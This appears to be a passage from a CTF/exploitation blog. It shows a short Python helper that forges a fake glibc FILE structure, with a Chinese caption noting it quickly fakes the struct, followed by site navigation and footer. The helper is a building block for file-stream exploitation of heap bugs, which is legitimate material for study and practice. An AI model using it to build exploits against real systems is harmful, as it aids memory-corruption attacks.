<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FILE</span>(<span class="params">_flags=<span class="number">0</span>,_IO_read_ptr=<span class="number">0</span>,_IO_read_end=<span class="number">0</span>,_IO_read_base=<span class="number">0</span>,_IO_write_base=<span class="number">0</span>,_IO_write_ptr=<span class="number">0</span>,_IO_write_end=<span class="number">0</span>,_IO_buf_base=<span class="number">0</span>,_IO_buf_end=<span class="number">1</span>,_fileno=<span class="number">0</span>,_chain=<span class="number">0</span></span>):</span></span><br><span class="line">	fake_IO = flat([</span><br><span class="line">	_flags,</span><br><span class="line">	_IO_read_ptr, _IO_read_end, _IO_read_base,</span><br><span class="line">	_IO_write_base, _IO_write_ptr, _IO_write_end,</span><br><span class="line">	_IO_buf_base, _IO_buf_end])</span><br><span class="line">	fake_IO += flat([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,_chain,_fileno])</span><br><span class="line">	fake_IO += flat([<span class="number">0xFFFFFFFFFFFFFFFF</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xFFFFFFFFFFFFFFFF</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">	fake_IO += flat([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xFFFFFFFF</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">return</span> fake_IO</span><br></pre></td></tr></table></figure>
<p>用它可以快速伪造 FILE 结构体</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/26/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/26/">26</a><span class="page-number current">27</span><a class="page-number" href="/page/28/">28</a><a class="extend next" rel="next" href="/page/28/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">277</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">145</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">3.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">58:25</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
